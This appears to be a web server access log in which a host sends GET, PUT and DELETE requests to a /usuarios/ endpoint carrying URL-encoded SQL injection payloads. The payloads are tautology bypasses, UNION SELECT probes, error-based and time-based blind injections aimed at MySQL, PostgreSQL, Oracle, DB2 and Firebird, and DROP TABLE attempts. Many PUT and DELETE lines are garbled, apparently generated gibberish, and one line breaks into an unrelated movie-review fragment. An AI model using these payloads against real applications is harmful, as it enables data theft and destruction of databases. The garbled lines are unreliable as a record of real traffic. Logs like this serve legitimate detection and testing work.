Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test-7021'%20or%203038=3038 HTTP/1.1
172.18.0.1 - GET /usuarios/test-9553%22%20)%20as%20geih%20where%206453%20=%206453%20or%208453%20=%208159%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20and%20extractvalue%20(%207982,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%207982%20=%207982,1%20)%20)%20)%20,0x717a767a71%20)%20)%20and%20'pphf'%20=%20'pphf HTTP/1.1
172.18.0.1 - GET /usuarios/test-8023'%20or%206872%20=%206872 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20as%20svim%20where%204924%20=%204924%20and%207932%20=%205870 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20as%20rrms%20where%208185%20=%208185%20union%20all%20select%20null,null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'+%20(%20select%20'nhlx'%20where%202291%20=%202291%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20) HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20union%20select%20@%20$_,version%20(%20)%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20'ejet'%20like%20'eent HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20as%20tncm%20where%208203%20=%208203%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20as%20bovm%20where%205560%20=%205560%20u/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20as%20cwsy%20where%202392%20=%203293%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20gxpb%20where%207107%20=%207107%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20yldg%20where%209894%20=%209894%20and%20make_set%20(%208403%20=%208403,8899%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20(%20%22umne%22%20like%20%22umne HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20vcvw%20where%202445%20=%202445%20and%208594%20=%20(%20select%208594%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22)%20as%20yfgu%20where%205286=5286%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20as%20cnpv%20where%204902%20=%204902%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20(%20case%20when%20(%202716%20=%208138%20)%20then%202716%20else%202716*%20(%20select%202716%20from%20mysql.db%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20and%20(%20(%20(%20%22tiet%22%20like%20%22tiet HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25'%20)%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20as%20ztrb%20where%201052%20=%201052%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20gcrr%20)%20 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%7C%7C%20(%20select%20'alxi'%20where%203967%20=%203967%20and%202388%20=%20benchmark%20(%205000000,md5%20(%200x6d457153%20)%20)%20 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20njzp%20where%208/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test-5643'%20)%20)%20union%20all%20select%201515,1515 HTTP/1.1
172.18.0.1 - GET /usuarios/test-1254%22%20or%204144%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204144%20=%204144%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118)))) HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20mvai%20where%205856%20=%205856%20and%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%208190%20=%208190,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name,%20DRo:%20from%20table_name%20FROM%20grababers;%20Where%20varie%20=%201%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_NibL_,%20S,%20,%20Lover/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20(%201928%20=%201928 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20'G'='Pg'%20OR%20False HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%202%20)%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20%7C%7C%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,macter_clamer_)%20)%20@@&&%20true%20and%20'%25'%20Like%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20LICE%20tru HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,evertime%20(%20'1,1,0b1110111101%20)%20)%20(%20select%201405%20from%20pg_sleep%20(%205%20)%20)%20and%20%22hhbw%22%20like%20%22hhbw HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-,%20USERPAM%20)%20; HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20usernim%20table_tame%20)%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verale_tembent'table%20time%20table_ciff%20(('1'+%20(%20select%20'ibva'%20where%201075%20=%201075%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20)%20+' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,nublec%20name,%20and%201241%20nile%20(%20'nachi HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1%20)%20,1,1%20)%20)%20(%20'x HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,hamelcane%20(%201/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verale_tembent%20tambent%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAtE%20)%20,%20tAWENnumel'%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbfn HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'1A HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,(uclecnamelect;sleep(bese,nimatabes),(SELECT(5)),(SELECT(2),0x1/(SELECT-2)),@%20AND%20%22v%22!=%22VV%22 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20userschart%20lame_s%20raberhoncorsuser%20hhave%20(%20'hanD%20'$HIve_'/**/%20)%20,0x0x0%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$1,,1,1,1,49,49,41,294,1294,1279,1279 HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SET%20AND%20Textresting%20the%20movie%20that%20included%20his%20wife%20and%20some%20very%20good%20things%20about%20it.%20It%20is%20an%20excellent%20film%20and%20seemingly%20drug%20dourt.%20This%20one%20did%20it%20really%20enjoyed%20it.%20I%20was%20admittedly%20really%20only%20internessing%20deal%20of%20writes%20his%20sipp HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20as%20fxid%20where%205926%20=%205926 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20and%206510%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20(%20case%20when%20(%208857%20=%201512%20)%20then%208857%20else%208857*%20(%20select%208857%20from%20mysql.db%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20as%20elnu%20where%205719%20=%205719%20or%208156%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20as%20cbka%20where%203176%20=%203176%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cc HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20where%206359%20=%206359%20and%20(%203020%20=%203020%20)%20*6703%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20as%20wuio%20where%205312%20=%205312%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20(%20%22ksrh%22%20=%20%22ksrh HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20or%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%208113%20=%208113,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20)%20)%20--%20tzry HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25'%20)%20)%20)%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20where%206523%20=%206523%20and%208594%20=%20(%20select%208594%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20as%20irsh%20where%204973%20=%204973%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20and%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%208190%20=%208190,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20(%20case%20when%20(%209490%20=%206134%20)%20then%209490%20else%20cast%20(%201%20as%20int%20)%20/%20(%20select%200%20from%20dual%20)%20end%20)%20from%20dual%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%7B%7B%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test-7639%22%20)%20or%203038%20=%203038 HTTP/1.1
172.18.0.1 - PUT /usuarios/test-6595%22%20order%20by%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20as%20qyic%20where%209736%20=%209736%20and%20elt%20(%203114%20=%203114,sleep%20(%205%20)%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20or%20row%20(%201045,7562%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%201045%20=%201045,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%208488%20union%20select%205584%20union%20select%2030 HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20(%20case%20when%20(%201412%20=%205313%20)%20then%201412%20else%201412*%20(%20select%201412%20from%20mysql.db%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%25@%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20where%207026%20=%207026 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20as%20vtad%20where%203653%20=%203653%20procedure%20analyse%20(%20extractvalue%20(%209627,concat%20(%200x5c,%20(%20benchmark%20(%205000000,md5%20(%200x4b774c75%20)%20)%20)%20)%20)%20,1%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20where%205925%20=%205925%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20where%208128%20=%208128 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20(%20'nqam'%20=%20'nqam HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20as%20zqeg%20where%204729%20=%204729%20and%20(%201098%20=%209682%20)%20*9682%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20userschart';%20(%20users%20and/**/1,0x1%20)%20anD%20%22V%22%20noT%20lIKe%20%22v%22%20aND%20%22B%22%20Not%20lIKE%20%22b HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabltance%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbwf HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl',%20(%20,1,1,1,0%20)%20,1,1,1%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ea/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usern;hell HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyuseri HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,adechare%20)%20;'tay/**/ HTTP/1.1
